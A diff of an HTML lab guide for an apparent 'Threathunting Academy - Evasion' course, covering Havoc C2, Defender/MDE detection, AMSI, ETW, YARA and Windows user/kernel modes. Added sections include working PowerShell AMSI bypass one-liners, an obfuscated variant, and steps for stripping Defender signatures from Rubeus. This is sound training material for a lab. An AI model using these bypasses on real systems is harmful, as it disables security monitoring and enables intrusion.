@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div id="sidebar-scrollbox" class="sidebar-scrollbox">
-                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.2.</strong> AMSI &amp; CLR</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.3.</strong> ETW</a></li><li><ol class="section"><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.3.1.</strong> Lab - Powershell</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.4.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.4.1.</strong> Lab - Havoc dotnet execute</a></li></ol></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.5.</strong> Metasploit Basics</a></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.6.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.7.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">1.7.1.</strong> Heuristics</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.7.2.</strong> UAC</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.7.3.</strong> Hooks</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.7.4.</strong> Syscalls</a></li><li class="expanded "><a href=".kernelcallbacks.html"><strong aria-hidden="true">1.7.5.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">1.7.6.</strong> EDR Stuff</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.8.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.8.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li></ol>
+                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.2.</strong> Windows Defender</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.3.</strong> AMSI &amp; CLR</a></li><li><ol class="section"><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.3.1.</strong> ETW</a></li><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.3.2.</strong> Lab - Powershell</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.4.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_static.html"><strong aria-hidden="true">1.4.1.</strong> Lab Static Analysis</a></li><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.4.2.</strong> Lab - Havoc dotnet execute</a></li></ol></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.5.</strong> Metasploit Basics</a></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.6.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.7.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.7.1.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.7.2.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.7.3.</strong> Lab - Remote Loader</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.8.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.8.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">2.1.</strong> Heuristics</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">2.2.</strong> UAC</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">2.3.</strong> Hooks</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">2.4.</strong> Syscalls</a></li><li class="expanded "><a href="kernelcallbacks.html"><strong aria-hidden="true">2.5.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">2.6.</strong> EDR Stuff</a></li></ol></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -154,7 +154,10 @@
 <p><img src="./images/cr_hackers.jpg" alt="image" /></p>
 <p>Welcome to the <strong>&quot;Threathunting Academy - Evasion&quot;</strong>  this is the official lab guide that will guide you through the infrastructure. Students will all have their own <strong>Windows 10 client machine</strong>, a shared central <code>Domain Controller</code> and a Kali <code>Red Team server and Forensics machine</code>. All logs are centrally collected on and Ubuntu server running Elasticsearch and Kibana.</p>
 <h1><a class="header" href="#havoc-c2" id="havoc-c2">Havoc C2</a></h1>
-<p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Starkiller GUI), <code>BruteRatel</code>, <code>Mythic C2</code>, <code>covenant</code> and <code>sliver</code> come to mind. In this training we'll be using a rather new, cobalt strike like framework called <code>Havoc C2</code>.</p>
+<p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Starkiller GUI), <code>BruteRatel</code>, <code>Mythic C2</code>, <code>Covenant</code> and <code>Sliver</code> come to mind. </p>
+<p><img src="./images/c2matrix.jpg" alt="Screenshot" /></p>
+<p>(<a href="https://c2matrix.webflow.io">https://c2matrix.webflow.io</a>)</p>
+<p>In this training we'll be using a rather new, cobalt strike like framework called <code>Havoc C2</code>.</p>
 <p><img src="./images/havoc.jpg" alt="Screenshot" /></p>
 <p><a href="https://github.com/HavocFramework/Havoc?tab=readme-ov-file">https://github.com/HavocFramework/Havoc?tab=readme-ov-file</a></p>
 <p>Attack frameworks typically all consist of the following elements</p>
@@ -388,6 +391,59 @@ execute</p>
 <blockquote>
 <p>Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)</p>
 </blockquote>
+<h1><a class="header" href="#chapter-01---windows-defender--mde-edr" id="chapter-01---windows-defender--mde-edr">Chapter 0.1 - Windows Defender / MDE (EDR)</a></h1>
+<blockquote>
+<p><em><strong>TL;DR :</strong></em> This chapter explains how most AV/EDR's work - in this case we'll focus on Microsoft Defender (the AV part), MDE (Microsoft Defender for Endpoint) which is the EDR component that we'll deal with later on.</p>
+</blockquote>
+<p><img src="./images/MDE.jpg" alt="Screenshot" /></p>
+<h3><a class="header" href="#detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde" id="detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde">Detection Techniques Used by <mark>Microsoft Defender Antivirus</mark> (Not MDE!!!)</a></h3>
+<table><thead><tr><th><strong>Detection Technique</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
+<tr><td><strong>Signature-Based Detection</strong></td><td>Compares files against a database of known malware signatures. Effective against known threats.</td></tr>
+<tr><td><strong>Heuristic Analysis</strong></td><td>Examines the behavior and characteristics of files to identify potentially malicious activity.</td></tr>
+<tr><td><strong>Behavioral Monitoring</strong></td><td>Monitors the behavior of applications and processes in real-time to detect and block malicious behavior.</td></tr>
+<tr><td><strong>Machine Learning</strong></td><td>Uses machine learning models to analyze and classify files based on their characteristics.</td></tr>
+<tr><td><strong>Cloud-Based Detection</strong></td><td>Sends suspicious files or metadata to the cloud for further analysis using advanced algorithms.</td></tr>
+<tr><td><strong>Memory Scanning</strong></td><td>Scans the system's memory to detect and remove malware that resides in memory.</td></tr>
+<tr><td><strong>Network Inspection</strong></td><td>Monitors network traffic for signs of malicious activity and blocks network-based attacks.</td></tr>
+</tbody></table>
+<h3><a class="header" href="#advanced-technologies" id="advanced-technologies">Advanced Technologies</a></h3>
+<table><thead><tr><th><strong>Technology</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
+<tr><td><strong>Hybrid Detection and Protection</strong></td><td>Combines on-device detection with cloud-based analysis for faster and more effective threat detection.</td></tr>
+<tr><td><strong>Behavior Monitoring Engine</strong></td><td>Continuously monitors for potential attacks post-execution.</td></tr>
+<tr><td><strong>Specialized Machine Learning Models</strong></td><td>Uses models for different file types and behaviors to make real-time verdicts.</td></tr>
+</tbody></table>
+<h3><a class="header" href="#differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde" id="differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde">Differences Between Microsoft Defender Antivirus (MDA) and Microsoft Defender for Endpoint (MDE)</a></h3>
+<table><thead><tr><th><strong>Feature</strong></th><th><strong>Microsoft Defender Antivirus (MDA)</strong></th><th><strong>Microsoft Defender for Endpoint (MDE)</strong></th></tr></thead><tbody>
+<tr><td><strong>Endpoint Detection and Response (EDR)</strong></td><td>Not available</td><td>Provides advanced EDR capabilities to detect, investigate, and respond to threats.</td></tr>
+<tr><td><strong>Threat and Vulnerability Management</strong></td><td>Not available</td><td>Offers comprehensive threat and vulnerability management to identify and remediate vulnerabilities.</td></tr>
+<tr><td><strong>Attack Surface Reduction (ASR)</strong></td><td>Limited</td><td>Provides extensive ASR rules to reduce the attack surface and prevent exploit techniques.</td></tr>
+<tr><td><strong>Automated Investigation and Remediation</strong></td><td>Not available</td><td>Automatically investigates and remediates threats using AI and automation.</td></tr>
+<tr><td><strong>Advanced Threat Hunting</strong></td><td>Not available</td><td>Offers advanced threat hunting capabilities with detailed search queries and analytics.</td></tr>
+<tr><td><strong>Integration with Microsoft 365</strong></td><td>Limited</td><td>Seamlessly integrates with Microsoft 365 and other enterprise security solutions.</td></tr>
+<tr><td><strong>Sandboxing and Detonation</strong></td><td>Not available</td><td>Uses sandboxing to analyze and detonate suspicious files in a controlled environment.</td></tr>
+<tr><td><strong>Behavioral Analytics and Anomaly Detection</strong></td><td>Basic</td><td>Employs advanced behavioral analytics and anomaly detection to identify sophisticated threats.</td></tr>
+<tr><td><strong>Threat Intelligence and Analytics</strong></td><td>Limited</td><td>Leverages Microsoft's Threat Intelligence to provide real-time insights and analytics.</td></tr>
+<tr><td><strong>Centralized Management and Reporting</strong></td><td>Basic</td><td>Provides centralized management, reporting, and alerting for enterprise environments.</td></tr>
+</tbody></table>
+<h3><a class="header" href="#summary" id="summary">Summary</a></h3>
+<ul>
+<li><strong>Endpoint Detection and Response (EDR):</strong> MDE provides advanced EDR capabilities that allow organizations to detect, investigate, and respond to threats in real-time. MDA does not offer these capabilities.</li>
+<li><strong>Threat and Vulnerability Management:</strong> MDE offers tools to identify and remediate vulnerabilities across the organization's environment. MDA does not include this feature.</li>
+<li><strong>Attack Surface Reduction (ASR):</strong> MDE provides comprehensive ASR rules to minimize the attack surface and prevent exploit techniques. MDA has limited ASR capabilities.</li>
+<li><strong>Automated Investigation and Remediation:</strong> MDE uses AI and automation to automatically investigate and remediate threats. MDA does not have this capability.</li>
+<li><strong>Advanced Threat Hunting:</strong> MDE offers advanced threat hunting capabilities, allowing security analysts to perform detailed searches and analytics. MDA does not include threat hunting features.</li>
+<li><strong>Integration with Microsoft 365:</strong> MDE seamlessly integrates with Microsoft 365 and other enterprise security solutions, providing a unified security experience. MDA has limited integration with Microsoft 365.</li>
+<li><strong>Sandboxing and Detonation:</strong> MDE uses sandboxing to analyze and detonate suspicious files in a controlled environment, providing detailed insights into their behavior. MDA does not offer sandboxing.</li>
+<li><strong>Behavioral Analytics and Anomaly Detection:</strong> MDE employs advanced behavioral analytics and anomaly detection to identify sophisticated threats. MDA has basic behavioral monitoring.</li>
+<li><strong>Threat Intelligence and Analytics:</strong> MDE leverages Microsoft's Threat Intelligence to provide real-time insights and analytics. MDA has limited threat intelligence capabilities.</li>
+<li><strong>Centralized Management and Reporting:</strong> MDE offers centralized management, reporting, and alerting for enterprise environments, making it easier to manage security across multiple endpoints. MDA has basic management and reporting features.</li>
+</ul>
+<p>These differences highlight the advanced capabilities that Microsoft Defender for Endpoint (MDE) provides, making it suitable for enterprise environments with complex security needs.</p>
+<p><img src="./images/howEDR.jpg" alt="Screenshot" />
+<img src="./images/static.jpg" alt="Screenshot" />
+<img src="./images/dynamic.jpg" alt="Screenshot" />
+<img src="./images/behavior.jpg" alt="Screenshot" /></p>
+<p><a href="https://www.edr-telemetry.com/windows.html">https://www.edr-telemetry.com/windows.html</a></p>
 <h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
 <blockquote>
 <p>WARNING : Amsi.dll is loaded into every powershell.exe process, but when running dotnet (csharp) binaries, amsi integrates directly with the clr which loads AMSI on demand. Amsi Bypasses that work in powershell don't necessariy work for the CLR integration.</p>
@@ -591,9 +647,27 @@ public class AmsiBypass
 Babel</p>
 <hr />
 <p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
+<p>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr</p>
+<pre><code class="language-powershell">$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+
+[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null, $null);[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;,&quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem)
+</code></pre>
+<p>Use this one:</p>
+<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+</code></pre>
+<blockquote>
+<p>Invoke-obfuscation
+set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+token
+string
+2</p>
+</blockquote>
+<p>output =</p>
+<pre><code class="language-powershell">[Ref].Assembly.GetType((&quot;{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}&quot;-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField((&quot;{0}{1}{2}&quot; -f 'amsi','InitFa','iled'),(&quot;{1}{0}{4}{2}{3}&quot; -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
+</code></pre>
 <h1><a class="header" href="#etw---event-tracing-for-windows-kernel-mode" id="etw---event-tracing-for-windows-kernel-mode">ETW - Event Tracing for Windows (Kernel mode)</a></h1>
 <blockquote>
-<p><strong>TL;DR</strong> ETW basically is  a kernel level debug logging mechanism in Windows - it allows to gather advanced telemetry about functions being called. Windows Even Logs contain a subset of ETW events. Typically used by application developers to debug programs, but has found its way as a telemetry source for EDR's. </p>
+<p><strong>TL;DR</strong> ETW basically is a kernel level debug logging mechanism in Windows - it allows to gather advanced telemetry about functions being called. <code>Windows Event Logs</code> contain a subset of ETW events. Typically used by application developers to debug programs, but has found its way as a telemetry source for <code>EDR's</code>. </p>
 </blockquote>
 <p>Event Tracing for Windows (ETW) is a high speed tracing facility built into Windows. Using a buffering and logging mechanism implemented in the operating system kernel, ETW provides an infrastructure for events raised by both user mode (apps) and kernel mode components (drivers). ETW can be used for system and app diagnosis, troubleshooting, and performance monitoring.</p>
 <p><img src="./images/etwarch.jpg" alt="Screenshot" />
@@ -994,6 +1068,79 @@ $f.SetValue($null,$true);
 <p>includes c-code!!!</p>
 <h1><a class="header" href="#static-analysis" id="static-analysis">Static Analysis</a></h1>
 <blockquote>
+<p><strong>TL;DR</strong> In this chapter we'll have a look at basic signature based AV evasion techniques. We'll use <code>strings.exe</code> and <code>yara</code> to explain the basic principles of pattern matching and modify existing malicious tools to bypass signature based detections.</p>
+</blockquote>
+<h2><a class="header" href="#1-strings" id="1-strings">1. Strings</a></h2>
+<hr />
+<h3><a class="header" href="#what-are-strings" id="what-are-strings"><strong>What are Strings?</strong></a></h3>
+<ul>
+<li>Human-readable text sequences in binary files (e.g., executables, memory dumps).</li>
+<li>May include URLs, IPs, commands, or error messages.</li>
+</ul>
+<h3><a class="header" href="#forensic-uses" id="forensic-uses"><strong>Forensic Uses</strong></a></h3>
+<ol>
+<li><strong>Malware Analysis</strong>: Identify behavior, networks, or obfuscated text.</li>
+<li><strong>Evidence Extraction</strong>: Recover passwords, filenames, or memory fragments.</li>
+<li><strong>Correlations</strong>: Match artifacts across files/systems.</li>
+<li><strong>Reverse Engineering</strong>: Understand program logic or libraries used.</li>
+</ol>
+<h3><a class="header" href="#tools" id="tools"><strong>Tools</strong></a></h3>
+<ul>
+<li><strong>Basic</strong>: <code>strings.exe</code> command (extract text from binaries). -&gt; Part of SysinternalsSuite</li>
+<li><strong>Advanced</strong>: Volatility, IDA Pro, Ghidra for deeper analysis.</li>
+</ul>
+<h3><a class="header" href="#challenges" id="challenges"><strong>Challenges</strong></a></h3>
+<ul>
+<li><strong>False Positives</strong>: Some strings are irrelevant.</li>
+<li><strong>Obfuscation</strong>: Text may be encrypted or encoded by attackers.</li>
+</ul>
+<hr />
+<h3><a class="header" href="#mini-lab-on-strings" id="mini-lab-on-strings">MINI-LAB on Strings</a></h3>
+<p>Run strings on NativeDump
+HxD or XXD on NativeDump.exe</p>
+<hr />
+<h2><a class="header" href="#2-yara-a-tool-for-forensics-and-malware-detection" id="2-yara-a-tool-for-forensics-and-malware-detection">2. YARA: A Tool for Forensics and Malware Detection</a></h2>
+<p><strong>YARA</strong> (Yet Another Recursive Acronym) is a powerful tool used in cybersecurity to detect and classify malware by creating rules to identify patterns in files, memory, or network traffic.</p>
+<h3><a class="header" href="#key-features" id="key-features"><strong>Key Features</strong></a></h3>
+<ul>
+<li><strong>Pattern Matching</strong>: Scans for specific strings, hex sequences, or behaviors in files.</li>
+<li><strong>Rules-Based</strong>: Allows defining conditions to identify malware traits.</li>
+<li><strong>Versatility</strong>: Works on files, running processes, or memory dumps.</li>
+</ul>
+<h3><a class="header" href="#applications" id="applications"><strong>Applications</strong></a></h3>
+<ul>
+<li><strong>Malware Detection</strong>: Identify known malware by their unique signatures.</li>
+<li><strong>Incident Response</strong>: Scan systems for malicious artifacts during investigations.</li>
+<li><strong>Threat Hunting</strong>: Monitor for emerging threats across files and traffic.</li>
+<li><strong>Reverse Engineering</strong>: Assist in analyzing malware samples and libraries.</li>
+</ul>
+<h3><a class="header" href="#why-yara-matters" id="why-yara-matters"><strong>Why YARA Matters</strong></a></h3>
+<ul>
+<li>Highly customizable for different security needs.</li>
+<li>Essential for proactive threat detection and forensic investigations.</li>
+</ul>
+<hr />
+<h3><a class="header" href="#mini-lab-on-yara" id="mini-lab-on-yara">MINI-LAB on YARA</a></h3>
+<p>Let's first install YARA support in VSCODE</p>
+<p><img src="./images/yaracode.jpg" alt="Screenshot" /></p>
+<pre><code class="language-yara">rule PE_Detected
+{
+    meta:
+        description = &quot;Detects 'MZ header'&quot;
+        author = &quot;Peter Girnus&quot;
+            web = &quot;https://www.petergirnus.com/blog&quot;
+
+    condition:
+        uint16(0) == 0x5a4d
+}
+</code></pre>
+<p><mark>Marked text</mark></p>
+<p>LitterBox</p>
+<p>threatcheck/GoCheck on rubeus (make sure defender execption is off for the folder both files are located)</p>
+<p>Check output threatcheck/gocheck</p>
+<p>erase with 0x00's</p>
+<p>use visual studio find all/replace all (match word)</p>
+<blockquote>
 <p>Visual Studio <code>2019</code> Components:</p>
 </blockquote>
 <p><img src="./images/vs_sharpkatz.jpg" alt="Screenshot" /></p>
@@ -1018,6 +1165,7 @@ cd MyApp
 dotnet build
 dotnet run
 </code></pre>
+<h1><a class="header" href="#lab-static-analysis" id="lab-static-analysis">Lab Static Analysis</a></h1>
 <p>Let's take a common attack tool &quot;Rubeus&quot;, compile it and see what Defender thinks of it.</p>
 <p><a href="https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s">https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s</a></p>
 <p><a href="https://github.com/GhostPack/Rubeus.git">https://github.com/GhostPack/Rubeus.git</a></p>
@@ -1084,28 +1232,6 @@ add to Havoc C2</p>
 <p>strings, threatcheck, gocheck, floss, yara</p>
 <p>C:\Temp&gt;gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
 c:\Git\ThreatCheck\ThreatCheck\bin\x64\Release&gt;ThreatCheck.exe -f C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe</p>
-<h1><a class="header" href="#yara" id="yara">YARA</a></h1>
-<p>Let's first install YARA support in VSCODE</p>
-<p><img src="./images/yaracode.jpg" alt="Screenshot" /></p>
-<pre><code class="language-yara">rule PE_Detected
-{
-    meta:
-        description = &quot;Detects 'MZ header'&quot;
-        author = &quot;Peter Girnus&quot;
-            web = &quot;https://www.petergirnus.com/blog&quot;
-
-    condition:
-        uint16(0) == 0x5a4d
-}
-</code></pre>
-<p><mark>Marked text</mark></p>
-<p>Run strings on NativeDump
-HxD or XXD on NativeDump.exe</p>
-<p>LitterBox</p>
-<p>threatcheck/GoCheck on rubeus (make sure defender execption is off for the folder both files are located)</p>
-<p>Check output threatcheck/gocheck</p>
-<p>erase with 0x00's</p>
-<p>use visual studio find all/replace all (match word)</p>
 <hr />
 <h1><a class="header" href="#notes" id="notes">Notes</a></h1>
 <p>install code </p>
@@ -1169,7 +1295,46 @@ cp evil.pdf /temp
 <p><img src="./images/8_adobe_1.jpg" alt="Screenshot" /></p>
 <p><img src="./images/9_adobe_2.jpg" alt="Screenshot" /></p>
 <p><img src="./images/10_session.jpg" alt="Screenshot" /></p>
-<h1><a class="header" href="#chapter-121---win32api-functions-kernel-and-user-mode" id="chapter-121---win32api-functions-kernel-and-user-mode">Chapter 1.2.1 - WIN32api, Functions, kernel and user mode</a></h1>
+<h1><a class="header" href="#chapter-15---win32api-functions-kernel-and-user-mode" id="chapter-15---win32api-functions-kernel-and-user-mode">Chapter 1.5 - &quot;WIN32api, Functions, kernel and user mode&quot;</a></h1>
+<p>Let's start with the basics, user-mode and kernel-mode:</p>
+<p><img src="./images/userandkernelmode.jpg" alt="Screenshot" /></p>
+<h1><a class="header" href="#user-mode-vs-kernel-mode-in-windows" id="user-mode-vs-kernel-mode-in-windows">User Mode vs Kernel Mode in Windows</a></h1>
+<h2><a class="header" href="#1-kernel-mode" id="1-kernel-mode"><strong>1. Kernel Mode</strong></a></h2>
+<ul>
+<li><strong>What it is</strong>: Kernel mode is the privileged mode of operation in which code has unrestricted access to all system resources, including hardware and memory. It operates at the core of the operating system.</li>
+<li><strong>Who uses it</strong>: The Windows kernel, device drivers, and other low-level system processes operate in kernel mode.</li>
+<li><strong>Capabilities</strong>:
+<ul>
+<li>Direct access to the hardware (e.g., CPU, memory, storage devices).</li>
+<li>Ability to execute critical system-level instructions.</li>
+</ul>
+</li>
+<li><strong>Risks</strong>: Errors in kernel-mode processes can lead to system crashes or instability (commonly referred to as a &quot;blue screen&quot;).</li>
+</ul>
+<h2><a class="header" href="#2-user-mode" id="2-user-mode"><strong>2. User Mode</strong></a></h2>
+<ul>
+<li><strong>What it is</strong>: User mode is the restricted mode in which applications and processes run. Code executed in user mode cannot directly access hardware or system resources and relies on the kernel for such operations.</li>
+<li><strong>Who uses it</strong>: Regular applications (e.g., browsers, text editors) and user-level processes operate in user mode.</li>
+<li><strong>Capabilities</strong>:
+<ul>
+<li>Processes in user mode interact with hardware indirectly through system calls provided by the kernel.</li>
+<li>Memory and resources are isolated, minimizing the impact of an application crash.</li>
+</ul>
+</li>
+<li><strong>Benefits</strong>: User mode enhances system stability by isolating applications from the core system operations. If a user-mode application crashes, it typically does not affect the operating system itself.</li>
+</ul>
+<h2><a class="header" href="#switching-between-modes" id="switching-between-modes"><strong>Switching Between Modes</strong></a></h2>
+<ul>
+<li>In Windows, switching between user mode and kernel mode happens when a user-mode application requests system resources (e.g., file I/O or network access). These requests are performed using <strong>system calls</strong>. The operating system processes these calls in kernel mode and returns the results to the user-mode application.</li>
+</ul>
+<hr />
+<h3><a class="header" href="#summary-1" id="summary-1"><strong>Summary</strong></a></h3>
+<ul>
+<li><strong>Kernel mode</strong> = Power and responsibility.</li>
+<li><strong>User mode</strong> = Safety and isolation.</li>
+</ul>
+<p>This separation is crucial for maintaining security and stability in modern operating systems.</p>
+<hr />
 <p>learn.micorosoft.com</p>
 <p>Explain Kernel vs user mode (ntdll.dll, kernel32.dll, kernelbase.dll)</p>
 <p>Explain DLL's</p>
@@ -1237,317 +1402,375 @@ class Program
     }
 }
 </code></pre>
-<h1><a class="header" href="#chapter-01---windows-defender--mde-edr" id="chapter-01---windows-defender--mde-edr">Chapter 0.1 - Windows Defender / MDE (EDR)</a></h1>
-<blockquote>
-<p><em><strong>TL;DR :</strong></em> This chapter explains how most AV/EDR's work - in this case we'll foce on Microsoft Defender (the AV part), MDE (Microsoft Defender for Endpoint) which is the EDR component that we'll deal with later on.</p>
-</blockquote>
-<p><img src="./images/MDE.jpg" alt="Screenshot" /></p>
-<h3><a class="header" href="#detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde" id="detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde">Detection Techniques Used by <mark>Microsoft Defender Antivirus</mark> (Not MDE!!!)</a></h3>
-<table><thead><tr><th><strong>Detection Technique</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
-<tr><td><strong>Signature-Based Detection</strong></td><td>Compares files against a database of known malware signatures. Effective against known threats.</td></tr>
-<tr><td><strong>Heuristic Analysis</strong></td><td>Examines the behavior and characteristics of files to identify potentially malicious activity.</td></tr>
-<tr><td><strong>Behavioral Monitoring</strong></td><td>Monitors the behavior of applications and processes in real-time to detect and block malicious behavior.</td></tr>
-<tr><td><strong>Machine Learning</strong></td><td>Uses machine learning models to analyze and classify files based on their characteristics.</td></tr>
-<tr><td><strong>Cloud-Based Detection</strong></td><td>Sends suspicious files or metadata to the cloud for further analysis using advanced algorithms.</td></tr>
-<tr><td><strong>Memory Scanning</strong></td><td>Scans the system's memory to detect and remove malware that resides in memory.</td></tr>
-<tr><td><strong>Network Inspection</strong></td><td>Monitors network traffic for signs of malicious activity and blocks network-based attacks.</td></tr>
-</tbody></table>
-<h3><a class="header" href="#advanced-technologies" id="advanced-technologies">Advanced Technologies</a></h3>
-<table><thead><tr><th><strong>Technology</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
-<tr><td><strong>Hybrid Detection and Protection</strong></td><td>Combines on-device detection with cloud-based analysis for faster and more effective threat detection.</td></tr>
-<tr><td><strong>Behavior Monitoring Engine</strong></td><td>Continuously monitors for potential attacks post-execution.</td></tr>
-<tr><td><strong>Specialized Machine Learning Models</strong></td><td>Uses models for different file types and behaviors to make real-time verdicts.</td></tr>
-</tbody></table>
-<h3><a class="header" href="#differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde" id="differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde">Differences Between Microsoft Defender Antivirus (MDA) and Microsoft Defender for Endpoint (MDE)</a></h3>
-<table><thead><tr><th><strong>Feature</strong></th><th><strong>Microsoft Defender Antivirus (MDA)</strong></th><th><strong>Microsoft Defender for Endpoint (MDE)</strong></th></tr></thead><tbody>
-<tr><td><strong>Endpoint Detection and Response (EDR)</strong></td><td>Not available</td><td>Provides advanced EDR capabilities to detect, investigate, and respond to threats.</td></tr>
-<tr><td><strong>Threat and Vulnerability Management</strong></td><td>Not available</td><td>Offers comprehensive threat and vulnerability management to identify and remediate vulnerabilities.</td></tr>
-<tr><td><strong>Attack Surface Reduction (ASR)</strong></td><td>Limited</td><td>Provides extensive ASR rules to reduce the attack surface and prevent exploit techniques.</td></tr>
-<tr><td><strong>Automated Investigation and Remediation</strong></td><td>Not available</td><td>Automatically investigates and remediates threats using AI and automation.</td></tr>
-<tr><td><strong>Advanced Threat Hunting</strong></td><td>Not available</td><td>Offers advanced threat hunting capabilities with detailed search queries and analytics.</td></tr>
-<tr><td><strong>Integration with Microsoft 365</strong></td><td>Limited</td><td>Seamlessly integrates with Microsoft 365 and other enterprise security solutions.</td></tr>
-<tr><td><strong>Sandboxing and Detonation</strong></td><td>Not available</td><td>Uses sandboxing to analyze and detonate suspicious files in a controlled environment.</td></tr>
-<tr><td><strong>Behavioral Analytics and Anomaly Detection</strong></td><td>Basic</td><td>Employs advanced behavioral analytics and anomaly detection to identify sophisticated threats.</td></tr>
-<tr><td><strong>Threat Intelligence and Analytics</strong></td><td>Limited</td><td>Leverages Microsoft's Threat Intelligence to provide real-time insights and analytics.</td></tr>
-<tr><td><strong>Centralized Management and Reporting</strong></td><td>Basic</td><td>Provides centralized management, reporting, and alerting for enterprise environments.</td></tr>
-</tbody></table>
-<h3><a class="header" href="#summary" id="summary">Summary</a></h3>
-<ul>
-<li><strong>Endpoint Detection and Response (EDR):</strong> MDE provides advanced EDR capabilities that allow organizations to detect, investigate, and respond to threats in real-time. MDA does not offer these capabilities.</li>
